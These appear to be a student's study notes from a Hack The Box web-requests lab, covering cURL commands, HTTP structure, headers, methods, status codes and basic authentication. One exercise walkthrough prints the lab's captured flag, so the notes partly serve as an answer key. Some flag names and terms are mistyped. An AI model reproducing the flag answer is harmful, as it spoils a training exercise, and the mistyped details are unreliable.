@@ -1,0 +1,2359 @@
+Cheat Sheet:
+
+
+*cURL:
+
+Command											Description
+
+ curl -h--------------------------------------------------------------------------------cURL help menu
+ curl inlanefreight.com-----------------------------------------------------------------Basic GET request
+ curl -s -O inlanefreight.com/index.html------------------------------------------------Download file
+ curl -k https://inlanefreight.com------------------------------------------------------Skip HTTPS (SSL) certificate validation
+ curl inlanefreight.com -v--------------------------------------------------------------Print full HTTP request/response details
+ curl -I https://www.inlanefreight.com--------------------------------------------------Send HEAD request (only prints response headers)
+ curl -i https://www.inlanefreight.com--------------------------------------------------Print response headers and response body
+ curl https://www.inlanefreight.com -A 'Mozilla/5.0'------------------------------------Set User-Agent header
+ curl -u admin:admin http://<SERVER_IP>:<PORT>/-----------------------------------------Set HTTP basic authorization credentials
+ curl http://admin:admin@<SERVER_IP>:<PORT>/--------------------------------------------Pass HTTP basic authorization credentials in the URL
+ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/-------------Set request header
+ curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'----------------------------------Pass GET parameters
+ curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/-------------Send POST request with POST data
+ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/--------------Set request cookies
+ curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php------------Send POST request with JSON data
+
+*APIs:
+
+Command											Description
+
+ curl http://<SERVER_IP>:<PORT>/api.php/city/london-------------------------------------Read entry
+ curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq-----------------------------------Read all entries
+ curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'---------------------Create (add) entry
+ curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'------------Update (modify) entry
+ curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City---------------------Delete entry
+
+*Browser DevTools:
+
+Shortcut			Description
+
+ [CTRL+SHIFT+I] or [F12]--------Show devtools
+ [CTRL+SHIFT+E]-----------------Show Network tab
+ [CTRL+SHIFT+K]-----------------Show Console tab
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+Hypertext Transfer Protocol (HTTP):
+
+*Most internet communications are made with web requests through the HTTP protocol. HTTP is an application-level protocol used to access the World Wide Web resources. The term "hypertext" stands for text containing links to other resources and text that the readers can easily interpret. HTTP consists of a client server where the client requests the server for a resource. The server processes the request and returns the requested resource. The default port for HTTP communications is PORT 80, though this can be changed to any port depending on the web server configuration. The same requests are utilized when we use the internet to visit different websites. We enter a Fully Qualified Domain Name (DQDN) as a Uniform Resource Locator (URL) to reach the desired websites like "www.hackthebox.com".
+-------------------------------------
+
+URL:
+
+Resources over HTTP are accessed via URL which offers many more specifications than simplifying a website we want to visit. 
+-----------------------------------
+
+URL Structure:
+http://admin:password@inlanefreight.com:80/dashboard.php?login=true#status
+
+"http" is the scheme, "inlanefreight.com" is the host, "dashboard.php" is the path, and "status" is the fragment.
+
+Here is what each component stands for:
+
+Component	Example			Description
+Scheme		ttp:// https://		This is used to identify the protocol being accessed by the client, and ends with a colon and a double slash (://)
+User Info	admin:password@		This is an optional component that contains the credentials (separated by a colon :) used to authenticate to the host, and is separated from the host with an at sign (@)
+Host		inlanefreight.com	The host signifies the resource location. This can be a hostname or an IP address
+Port		80			The Port is separated from the Host by a colon (:). If no port is specified, http schemes default to port 80 and https default to port 443
+Path		dashboard.php		This points to the resource being accessed, which can be a file or a folder. If there is no path specified, the server returns the default index (e.g. index.html).
+Query String	?login=true		the query string starts with a question mark (?), and consists of a parameter (e.g. login) and a value (e.g. true). Multiple parameters can be separated by an ampersand 					(&).
+Fragments	#status			fragments are processed by the browsers on the client-side to locate sections within the primary resource (e.g. a header or section on the page).
+
+--------------------------------------
+
+HTTP Flow:
+
+The first time a user enters the URL (inlanefrieght.com) into the browser it sends a request to a DNS (Domain Name Resolution) server to resolve the domain and get its IP address. The DNS server looks up the IP address for "inlanefreights.com" and returns it. All domain names need to be resolved this way as a server cant communicate without an IP address.
+
+Our browsers usually first look up records in the local "/etc/hosts" file and if the requested domain does not exist within it they would contact other DNS servers. We can use the "/etc/hosts" to manually add records for DNS resolution by adding the IP address followed by the domain name.
+
+Once the browser gets the IP address linked to the requested domain it sends a "get" request to the default HTTP port and asks for the root "/" path. then the web server receives the request and processes it. By default servers are configured to return an index file when a request for "/" is received.
+
+Structure Example:
+
+The user enters "inlanefreight.com" into a web browser, the web browser sends a "where is inlanefreight.com" to the DNS server, the DNS server sends the IP address "152.153.81.14" back to the web browser, the web browser sends an HTTP request to "152.153.81.14:80" and asks that IP to "Get/HTTP/1.1", then the InlaneFreight web server sends the "HTTP/1.1 200 OK" response back to the browser which gives the index.html and other folder contents for the website. The "200 OK" means that the request was successfully processed. 
+
+------------------------------------
+
+cURL:
+
+cURL (client URL) is a command-line tool and library that primarily supports HTTP along with many other protocols. This makes it a good candidate for scripts as well as automation, making it essential for sending various types of web requests from the command line which is necessary for many types of web penetration tests.
+
+We can send a basic HTTP request to any URL by using it as an argument for cURL, example:
+
+Romeltier1@htb[/htb]$ curl inlanefreight.com
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+...SNIP...
+
+We see that cURL does not render the HTML/JavaScript/CSS code, unline a web browser but instead prints it in its raw format. As a penetration tester we are mainly interested in the request and response context which usually becomes much faster and more convenient than a web browser.
+
+We may also use cURL to download a page or a file and output the content into a file using the -0 flag. If we want to specify the output file name we can use the -o flag and specify the name, otherwise we can use -0 and cURL will use the remote file name, example: 
+
+Romeltier1@htb[/htb]$ curl -O inlanefreight.com/index.html
+Romeltier1@htb[/htb]$ ls
+index.html
+
+As we can see the output was not printed this time but rather saved into "index.html". We noticed that cURL still printed some status while processing the request. We can silent the status with the -s flag, example: 
+
+Romeltier1@htb[/htb]$ curl -s -O inlanefreight.com/index.html
+
+This time, cURL did not print anything as the output was saved into the "index.html" file. 
+
+Finally we may use the "-h" flag to see what other options we may use with cURL, example:
+
+Romeltier1@htb[/htb]$ curl -h
+Usage: curl [options...] <url>
+ -d, --data <data>   HTTP POST data
+ -h, --help <category> Get help for commands
+ -i, --include       Include protocol response headers in the output
+ -o, --output <file> Write to file instead of stdout
+ -O, --remote-name   Write output to a file named as the remote file
+ -s, --silent        Silent mode
+ -u, --user <user:password> Server user and password
+ -A, --user-agent <name> Send User-Agent <name> to server
+ -v, --verbose       Make the operation more talkative
+
+This is not the full help, this menu is stripped into categories.
+Use "--help category" to get an overview of all categories.
+Use the user manual `man curl` or the "--help all" flag for all options.
+
+As the above message mentions we may use "--help all" to print a more detailed help menu or "--help category" or "--help http" to print the detailed help of a specific flag. If we ever need to read more detailed documentation we can use the "man curl" command to view the full cURL manual page.
+
+Working example to get the flag from "/download.php" file from a Server:
+
+1. First I open a terminal and type in the command line "curl (followed by the victim IP address)". The out put is:
+
+curl 94.237.54.112:42663
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blank Page</title>
+</head>
+
+<body>
+    This page is intentionally left blank.
+    <br>
+    Using cURL should be enough.
+</body>
+
+</html>
+
+2. The command displayed the page contents but not the flag from the "/download.php" file. Now I'm going to type "curl (followed by the full IP address and Port, ex: 94.237.54.112:42663) /download.php". All together the command will look like this "curl 94.237.54.112:42663/download.php". The output is:
+
+HTB{64$!c_cURL_u$3r}
+
+3. Now the output is displaying the flag from the file of 94.237.54.112:42663 IP address.
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+Hypertext Transfer Protocol Secure (HTTPS):
+
+*All communications are transferred in an encrypted format so even if third party does intercept the request they would not be able to extract the data out of it. Although the data transferred through the HTTPS protocol may be encrypted the request may still reveal the visited website URL if it contacted a clear text DNS server. For this reason it is recommended to utilize encrypted DNS servers or utilize a VPN service to ensure all traffic is properly encrypted. 
+
+
+-----------------------------
+
+
+HTTPS Flow:
+
+1. The user types in "inlinefreight.com" into their browser.
+
+2. the browser sends an HTTP request to inlanfreight.com:80 (GET\HTTP/1.1).
+
+3. Then it gets moved permanently to HTTPS (HTTP/1.1 301 Moved Permanently).
+
+4. Then the user gets connected to inlanfreight:443 (client Hello).
+
+5. Then there's a server key exchange (server hello).
+
+6. Then there's an encrypted handshake (client key exchange).
+
+7. Then the encrypted handshake is finished (Finished).
+
+8. Not the communication between the user and InlaneFreight is encrypted (Encrypted HTTP Communication).
+
+---------------------------------
+
+
+cURL for HTTPS:
+
+*cURL should automatically handle all HTTPS communication standards and perform a secure handshake and then encrypt and decrypt data automatically. However, if we ever contact a website with an invalid SSL certificate or an outdated one the cURL by default would not proceed with the communication to protect against a man in the middle attack (MITM). We may face such an issue when testing a local web application or with a web application hosted for practice purposes, as such web applications may not yet have implemented a valid SSL certificate. To skip the certificate check with cURL we can use the "-k" flag. Example:
+
+Romeltier1@htb[/htb]$ curl -k https://inlanefreight.com
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+...SNIP...
+
+--------------------------------
+
+
+HTTP Requests and Responses:
+
+*HTTP communications mainly consist of an HTTP request and an HTTP response. An HTTP request is made by the client (cURL/browser) and is processed by the server (web server). The request contain all of the details we require from the server including the resource (URL, path, parameters), any request data, headers or options we specify, and many other options. Once the server receives the HTTP request it processes it and responds by sending the HTTP response which contains the response code and may contain the resource data if the requester has access to it.
+
+
+HTTP Request:
+
+	   (HTTP Method)  (Path)    (HTTP version)
+		|	     |		  |
+	      (GET)/(users/login.html)(HTTP/1.1)
+	    | Host: inlanefrieght.com						|
+	    | User-Agent: Mozilla/5.0 (ubuntu; Linux x86_64;) Firefox/78.0      |
+	    | Accept: text/html, application/xhtml+xml, application/xml	|
+HTTP Headers| Accept-Language: en-US, en;q=0.5					|
+	    | Accept-Encoding: gzip, deflate					|--Header Values
+	    | Content-Type: text/html; charset=UTF-8				|
+	    | Connection: close							|
+	    | Cookie: PHPSESSID=c4ggt4jull9obt7aupa55o8vbf			|
+	    | Upgrade-Insecure-Requests: 1					|
+	    | Cache-Control: max-age=0						|
+
+*The image above shows an HTTP GET request to the URL: http://inlanefreight.com/users/login.html
+
+Field		Example			Description
+--------	--------		------------
+Method		GET			The HTTP method or verb, which specifies the type of action to perform.
+Path		/users/login.html	The path to the resource being accessed. This field can also be suffixed with a query string (e.g. ?username=user).
+Version		HTTP/1.1		The third and final field is used to denote the HTTP version.
+
+*The next set of lines contain HTTP header value pairs, like Host, User-Agent, Cookie, and many other possible headers. These headers are used to specify various attributes of a request. The headers are terminated with a new line, which is necessary for the server to validate the request. Finally, a request may end with the request body and data. HTTP version 1.X sends requests as clear-text, and uses a new-line character to separate different fields and different requests. HTTP version 2.X, on the other hand, sends requests as binary data in a dictionary form.
+
+*Once the server processes our request it sends its response. Example:
+
+<html lang="en"><head><meta http-equiv="Content-Type"
+content="text/html; charset=UTF-8">
+	<title>Inlane Freight</title>
+	<link href=" ./style.css" rel="stylesheet">
+		</head>
+
+*The first line of an HTTP response contains two fields separated by spaces. The first being the HTTP version (HTTP/1.1) and the second denotes the HTTP response code (200 OK). Reesponse codes are used to determine the requests status. After the first line the response lists its headers. Finally the response may end with a response body which is separated by a new line after the headers. The response body is usually defined as html code however it can also respond with other code types such as JSON, website resources such as images, style sheets or scripts, or even a document such as a PDF document hosted on the webserver.
+
+-----------------------------------
+
+
+cURL:
+
+*cURL also allows us to preview the full HTTP request and the full HTTP response which can become very handy when performing web penetration tests or writing exploits. To view the full HTTP request and response we can simply add the "-v" verbose flag to our earlier commands and it should print both the request and response. Example: 
+
+Romeltier1@htb[/htb]$ curl inlanefreight.com -v
+
+-----------------------------------
+
+
+	Command									Description
+ curl -h									cURL help menu
+ curl inlanefreight.com								Basic GET request
+ curl -s -O inlanefreight.com/index.html					Download file
+ curl -k https://inlanefreight.com						Skip HTTPS (SSL) certificate validation
+ curl inlanefreight.com -v							Print full HTTP request/response details
+ curl -I https://www.inlanefreight.com						Send HEAD request (only prints response headers)
+ curl -i https://www.inlanefreight.com						Print response headers and response body
+ curl https://www.inlanefreight.com -A 'Mozilla/5.0'				Set User-Agent header
+ curl -u admin:admin http://<SERVER_IP>:<PORT>/					Set HTTP basic authorization credentials
+ curl http://admin:admin@<SERVER_IP>:<PORT>/					Pass HTTP basic authorization credentials in the URL
+ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/	Set request header
+ curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'	Pass GET parameters
+ curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/	Send POST request with POST data
+ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/	Set request cookies
+ curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php		Send POST request with JSON data
+APIs
+	Command																			Description
+ curl http://<SERVER_IP>:<PORT>/api.php/city/london														Read entry
+ curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq														Read all entries
+ curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'			Create (add) entry
+ curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'		Update (modify) entry
+ curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City	Delete entry
+
+Browser DevTools:
+
+	Shortcut			Description
+ [CTRL+SHIFT+I] or [F12]		Show devtools
+ [CTRL+SHIFT+E]				Show Network tab
+ [CTRL+SHIFT+K]				Show Console tab
+
+*   Trying SERVER_IP:80...
+* TCP_NODELAY set
+* Connected to inlanefreight.com (SERVER_IP) port 80 (#0)
+> GET / HTTP/1.1
+> Host: inlanefreight.com
+> User-Agent: curl/7.65.3
+> Accept: */*
+> Connection: close
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 401 Unauthorized
+< Date: Tue, 21 Jul 2020 05:20:15 GMT
+< Server: Apache/X.Y.ZZ (Ubuntu)
+< WWW-Authenticate: Basic realm="Restricted Content"
+< Content-Length: 464
+< Content-Type: text/html; charset=iso-8859-1
+< 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+
+...SNIP...
+
+*As we see the first time we get the full HTTP request and response. The request simply GET / HTTP/1.1 along with the Host, User-Agent and Accept headers. In return the HTTP response contained the HTTP/1.1 401 Unauthorized which indicates that we do not have access over the requested resource. Similar to the request, the response also contained several headers sent by the server, including Date, Content-Length, and Content-Type. Finally, the response contained the response body in HTML, which is the same one we received earlier when using cURL without the -v flag. The -vvv flag shows an even more verbose output. Try to use this flag to see what extra request and response details get displayed with it.
+
+---------------------------------------------
+
+
+Browser DevTools:
+
+*Most modern web browsers come with built in developer tools (devtools) which are mainly intended for developers to test their web applications. However, as a penetration tester these tools can be a vital asset in any web assessment we perform as a browser (and its devtools) are among the assets we are most likely to have in every web assessment exercise. Whenever we visit any website or access any web application our browser sends multiple web requests and handles multiple HTTP responses to render the final view we see in a browser window. To open the browser devtools in either Chrome or Firefox we can click "CTRL+SHIFT+I" or simply click "F12". The devtools contain multiple tabs, each of which has its own use. If we click on the Network tab and refresh the page we should be able to see the list of requests sent by the page. As we can see, the devtools show us at a glance the response status (i.e. response code), the request method used (GET), the requested resource (i.e. URL/domain), along with the requested path. Furthermore, we can use Filter URLs to search for a specific request, in case the website loads too many to go through.
+
+
+Exercise:
+
+1. The first thing I do is go to Firefox, click the hamburger icon on the top right of the page, go to more tools, then click web developer tools.
+
+2. Now I type the IP of my target in the URL, go to Network, and i can see the HTTP request which was "GET".
+
+3. Now I go to my command line and type "curl HTTP://94.237.58.211:49988" and press enter. If I need more information I type "curl -v HTTP://94.237.58.211:49988". This gives me more information and now I can see the version of the server.
+
+
+----------------------------------------------
+
+
+HTTP Headers:
+
+*Some headers are only used with either requests or response while some other general headers are common to both. Headers can have one or multiple values, appended after the header name and separated by a colon. We can divide these headers into categories. Example:
+
+1. General Headers
+
+2. Entity Headers
+
+3. Request Headers
+
+4. Response Headers
+
+5. Security Headers
+
+-------------------------
+
+General Headers:
+
+*General headers are used in both HTTP requests and responses. They are contextual and are used to describe the message rather than its contents. Example:
+
+Header		Example					Description
+Date		Date: Wed, 16 Feb 2022 10:38:44 GMT	Holds the date and time at which the message originated. It's preferred to convert the time to the standard UTC time zone.
+Connection	Connection: close			Dictates if the current network connection should stay alive after the request finishes. Two commonly used values for this header are close and keep-								alive. The close value from either the client or server means that they would like to terminate the connection, while the keep-alive header indicates that 							the connection should remain open to receive more data and input.
+
+------------------------
+
+Request Headers:
+
+*The client sends request headers in an HTTP transaction. These headers are used in an HTTP request and do not relate to the content of the message. The following headers are commonly seen in HTTP requests, Example:
+
+Header:			Example:					Description:
+Host			Host: www.inlanefreight.com			Used to specify the host being queried for the resource. This can be a domain name or an IP address. HTTP servers can be configured to 										host different websites, which are revealed based on the hostname. This makes the host header an important enumeration target, as it can 									indicate the existence of other hosts on the target server.
+User-Agent		User-Agent: curl/7.77.0	The User-Agent 		header is used to describe the client requesting resources. This header can reveal a lot about the client, such as the browser, its 										version, and the operating system.
+Referer			Referer: http://www.inlanefreight.com/		Denotes where the current request is coming from. For example, clicking a link from Google search results would make https://google.com 									the referrer. Trusting this header can be dangerous as it can be easily manipulated, leading to unintended consequences.
+Accept			Accept: */*					The Accept header describes which media types the client can understand. It can contain multiple media types separated by commas. The */* 									value signifies that all media types are accepted.
+Cookie			Cookie: PHPSESSID=b4e4fbd93540			Contains cookie-value pairs in the format name=value. A cookie is a piece of data stored on the client-side and on the server, which acts 									as an identifier. These are passed to the server per request, thus maintaining the client's access. Cookies can also serve other purposes, 									such as saving user preferences or session tracking. There can be multiple cookies in a single header separated by a semi-colon.
+Authorization		Authorization: BASIC cGFzc3dvcmQK		Another method for the server to identify clients. After successful authentication, the server returns a token unique to the client. 										Unlike cookies, tokens are stored only on the client-side and retrieved by the server per request. There are multiple types of 											authentication types based on the webserver and application type used.
+----------------------------
+
+Response Headers:
+
+*Response headers can be used in an HTTP response and do not relate to the content. Certain response headers such as Age, Location, and Server are used to provide more context about the response. The following headers are commonly seen in HTTP responses. Example:
+
+Header			Example						Description
+Server			Server: Apache/2.2.14 (Win32)			Contains information about the HTTP server, which processed the request. It can be used to gain information about the server, such as its 									version, and enumerate it further.
+Set-Cookie		Set-Cookie: PHPSESSID=b4e4fbd93540		Contains the cookies needed for client identification. Browsers parse the cookies and store them for future requests. This header follows 									the same format as the Cookie request header.
+WWW-Authenticate	WWW-Authenticate: BASIC realm="localhost"	Notifies the client about the type of authentication required to access the requested resource.
+
+----------------------------
+
+Security Headers:
+
+*With the increase in the variety of browsers and web-based attacks, defining certain headers that enhanced security was necessary. HTTP security headers are a class of response headers used to specify certain rules and policies to be followed by the browser while accessing the website. Example:
+
+Header:							Example:						Description:
+Content-Security-Policy					Content-Security-Policy: script-src 'self'		Dictates the website's policy towards externally injected resources. This could be JavaScript code 														as well as script resources. This header instructs the browser to accept resources only from 															certain trusted domains, hence preventing attacks such as Cross-site scripting (XSS).
+Strict-Transport-Security				Strict-Transport-Security: max-age=31536000		Prevents the browser from accessing the website over the plaintext HTTP protocol, and forces all 														communication to be carried over the secure HTTPS protocol. This prevents attackers from sniffing 														web traffic and accessing protected information such as passwords or other sensitive data.
+Referrer-Policy						Referrer-Policy: origin					Dictates whether the browser should include the value specified via the Referer header or not. It 														can help in avoiding disclosing sensitive URLs and information while browsing the website.
+
+*There are many other contextual headers that can be used in HTTP communications. It's also possible for applications to define custom headers based on their requirements. 
+
+-----------------------------
+
+cURL:
+
+*If we were only interested in seeing the response headers we could use "-I" flag to send a HEAD request and only display the response headers. Furthermore we can use the "-i" flag to display both the headers and the response body (HTML code). The difference between the two is that "-I" sends a head request while "-i" sends any request we specify and prints the headers as well. The following command shows an example output of using the "-I" flag. Example:
+
+Romeltier1@htb[/htb]$ curl -I https://www.inlanefreight.com
+
+Host: www.inlanefreight.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko)
+Cookie: cookie1=298zf09hf012fh2; cookie2=u32t4o3tb3gg4
+Accept: text/plain
+Referer: https://www.inlanefreight.com/
+Authorization: BASIC cGFzc3dvcmQK
+
+Date: Sun, 06 Aug 2020 08:49:37 GMT
+Connection: keep-alive
+Content-Length: 26012
+Content-Type: text/html; charset=ISO-8859-4
+Content-Encoding: gzip
+Server: Apache/2.2.14 (Win32)
+Set-Cookie: name1=value1,name2=value2; Expires=Wed, 09 Jun 2021 10:18:14 GMT
+WWW-Authenticate: BASIC realm="localhost"
+Content-Security-Policy: script-src 'self'
+Strict-Transport-Security: max-age=31536000
+Referrer-Policy: origin
+
+*In addition to viewing headers cURL also allows us to set request headers with the "-H" flag. Some headers like the User-Agent or Cookie have their own flags. For example we can use the "-A" to set our User-Agent. Example:
+
+Romeltier1@htb[/htb]$ curl https://www.inlanefreight.com -A 'Mozilla/5.0'
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+...SNIP...
+
+--------------------------------
+
+Browser DevTools:
+
+*We can go to the Network tab to view the different requests made by the page. We can click on any of the requests to view its details. In the first Headers tab we see both the HTTP request and the HTTP response headers. The devtools automatically arrange the headers into sections but we can click on the "Raw" button to view their details in their raw format. Furthermore we can check the "Cookies" tab to see any cookies used by the request.
+
+--------------------------------
+
+Exercise:
+
+1. First I open Mozilla fire fox, then I click on the hamburger icon on the top right of the screen, then i go to more tools, then i click on web developer tools.
+
+2. Now I type my target IP in the webpage URL, Then I click on "Network", then I go to my terminal and type "curl -I 94.237.59.63:33854". 
+
+3. Now I go back to the browser and click "XHR", then I click on the "Initiator", Then I click on "Response" to view request to the flag.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+HTTP Methods and Codes:
+
+
+*HTTP supports multiple methods for accessing a resource. In HTTP protocol several request methods allow the browser to send information forma or files to the server. These methods are used among other things to tell the server how to process the request we send and how to reply.
+
+Request Methods:
+
+*The following are some of the commonly used methods:
+
+Method:		Description:
+GET		Requests a specific resource. Additional data can be passed to the server via query strings in the URL (e.g. ?param=value).
+POST		Sends data to the server. It can handle multiple types of input, such as text, PDFs, and other forms of binary data. This data is appended in the request body present after the headers. The POST 		method is commonly used when sending information (e.g. forms/logins) or uploading data to a website, such as images or documents.
+HEAD		Requests the headers that would be returned if a GET request was made to the server. It doesn't return the request body and is usually made to check the response length before downloading 			resources.
+PUT		Creates new resources on the server. Allowing this method without proper controls can lead to uploading malicious resources.
+DELETE		Deletes an existing resource on the webserver. If not properly secured, can lead to Denial of Service (DoS) by deleting critical files on the web server.
+OPTIONS		Returns information about the server, such as the methods accepted by it.
+PATCH		Applies partial modifications to the resource at the specified location.
+
+*The list only highlights a few of the most commonly used HTTP methods. The availability of a particular method depends on the server as well as the application configuration. Most modern web applications mainly rely on the "GET" and "POST" methods. However any web application that utilizes REST APIs also rely on "PUT" and "DELETE" which are used to update and delete data on the API endpoint respectively.
+
+---------------------------------
+
+Response Codes:
+
+*HTTP status codes are used to tell the client the status of their request. An HTTP server can return five types of response codes: 
+
+Type:	Description:
+1xx	Provides information and does not affect the processing of the request.
+2xx	Returned when a request succeeds.
+3xx	Returned when the server redirects the client.
+4xx	Signifies improper requests from the client. For example, requesting a resource that doesn't exist or requesting a bad format.
+5xx	Returned when there is some problem with the HTTP server itself.
+
+*The following are some of the commonly seen examples from each of the above HTTP method types:
+
+Code:				Description:
+200 OK				Returned on a successful request, and the response body usually contains the requested resource.
+302 Found			Redirects the client to another URL. For example, redirecting the user to their dashboard after a successful login.
+400 Bad Request			Returned on encountering malformed requests such as requests with missing line terminators.
+403 Forbidden			Signifies that the client doesn't have appropriate access to the resource. It can also be returned when the server detects malicious input from the user.
+404 Not Found			Returned when the client requests a resource that doesn't exist on the server.
+500 Internal Server Error	Returned when the server cannot process the request.
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Get:
+
+*Whenever we visit any URL our browsers default to a GET request to obtain the remote resources hosted at that URL. Once the browser receives the initial page it is requesting it may send other requests using various HTTP methods. This can be observerd through the Network tab in the browser devtools. Pick any website of your choosing and monitor the Network tab in the browser devtools as you visit it to understand what the page is performing. This technique can be used to thoroughly understand how a web application interacts with its backend which can be an essential excersize for any web application assessment or bug bounty exercise.
+
+-----------------------------
+
+HTTP Basic Auth:
+
+*When we visit the exercise found at the end of this section it prompts us to enter a username and a password. Unlike the usual login forms which utilize HTTP parameters to validate the user credentials (Post request) this type of authentication utilizes a basic HTTP authentication which is handled directly by the webserver to protect a specific page/ directory without directly interacting the web application. To access the page we have to enter a valid pair of credentials.
+
+*Once we enter the credentials we should get access to the page. Lets try to access the page with cURL and we'll add "-i" to view the response headers. Example:
+
+
+Romeltier1@htb[/htb]$ curl -i http://<SERVER_IP>:<PORT>/
+HTTP/1.1 401 Authorization Required
+Date: Mon, 21 Feb 2022 13:11:46 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Cache-Control: no-cache, must-revalidate, max-age=0
+WWW-Authenticate: Basic realm="Access denied"
+Content-Length: 13
+Content-Type: text/html; charset=UTF-8
+
+Access denied
+
+*As we can see we get "Access denied" in the response body and we also get "basic realm="Access denied" in the www=authentication header which confirms that this page indeed uses basic HTTP auth as discussed in the headers section. To provide the credentials through cURL we can use the "-u" flag. Example:
+
+Romeltier1@htb[/htb]$ curl -u admin:admin http://<SERVER_IP>:<PORT>/
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+...SNIP...
+
+*This time we do get the page in the response. There is another method we can provided the basic HTTP auth credentials which is directly through the URL as (username:password@URL). If we try the same with cURL or our browser we do get access to the page as well. Example:
+
+Romeltier1@htb[/htb]$ curl http://admin:admin@<SERVER_IP>:<PORT>/
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+...SNIP...
+
+*We may also try visiting the same URL on a browser and we should get authenticated as well.
+
+--------------------------------------
+
+
+HTTP Authorization Header:
+
+*If we add the "-v" flag to either of our earlier cURL commands, Example:
+
+Romeltier1@htb[/htb]$ curl -v http://admin:admin@<SERVER_IP>:<PORT>/
+
+*   Trying <SERVER_IP>:<PORT>...
+* Connected to <SERVER_IP> (<SERVER_IP>) port PORT (#0)
+* Server auth using Basic with user 'admin'
+> GET / HTTP/1.1
+> Host: <SERVER_IP>
+> Authorization: Basic YWRtaW46YWRtaW4=
+> User-Agent: curl/7.77.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Mon, 21 Feb 2022 13:19:57 GMT
+< Server: Apache/2.4.41 (Ubuntu)
+< Cache-Control: no-store, no-cache, must-revalidate
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Pragma: no-cache
+< Vary: Accept-Encoding
+< Content-Length: 1453
+< Content-Type: text/html; charset=UTF-8
+< 
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+...SNIP...
+
+*As we are using basic HTTP auth we see that our HTTP request sets the authorization header to basic "YWRtaW46YWRtaW4=" which is the base64 encoded value of admin:admin. If we were using a modern method of authentication (JTW) the authorization would be of type Bearer and would contain a longer encrypted token. Lets try to manually set the Authorization without supplying the credential to see if it does allow us access to the page. We can set the header with the "-H" flag and we will use the same value from the above HTTP request. We can add the "-H" flag multiple times to specify multiple headers. Example:
+
+Romeltier1@htb[/htb]$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/
+
+<!DOCTYPE html
+<html lang="en">
+
+<head>
+...SNIP...
+
+*As we see this also gave us access to the page. These are a few methods we can use to authenticate to the page. Most modern web applications use login forms built with the back-end scripting language (PHP) which utilize HTTP POST requests to authenticate the users and then return a cookie to maintain their authentication.
+
+---------------------------------
+
+
+GET Parameters:
+
+*Once we are authenticated we get access to a City Search function in which we can enter a search term and get a list of matching cities. As the page returns our results it may be contacting a remote resource to obtain the information, and then display them on the page. To verify this, we can open the browser devtools and go to the Network tab, or use the shortcut [CTRL+SHIFT+E] to get to the same tab. Before we enter our search term and view the requests, we may need to click on the trash icon on the top left, to ensure we clear any previous requests and only monitor newer requests. After that, we can enter any search term and hit enter, and we will immediately notice a new request being sent to the backend: When we click on the request, it gets sent to search.php with the GET parameter search=le used in the URL. This helps us understand that the search function requests another page for the results.
+
+*Now, we can send the same request directly to search.php to get the full search results, though it will probably return them in a specific format (e.g. JSON) without having the HTML layout shown in the above screenshot.
+
+*To send a GET request with cURL, we can use the exact same URL seen in the above screenshots since GET requests place their parameters in the URL. However, browser devtools provide a more convenient method of obtaining the cURL command. We can right-click on the request and select Copy>Copy as cURL. Then, we can paste the copied command in our terminal and execute it, and we should get the exact same response. Example:
+
+Romeltier1@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/search.php?search=le' -H 'Authorization: Basic YWRtaW46YWRtaW4='
+
+Leeds (UK)
+Leicester (UK)
+
+*The copied command will contain all headers used in the HTTP request. However we can remove most of them and only keep the necessary authentication headers like the Authorization header.
+
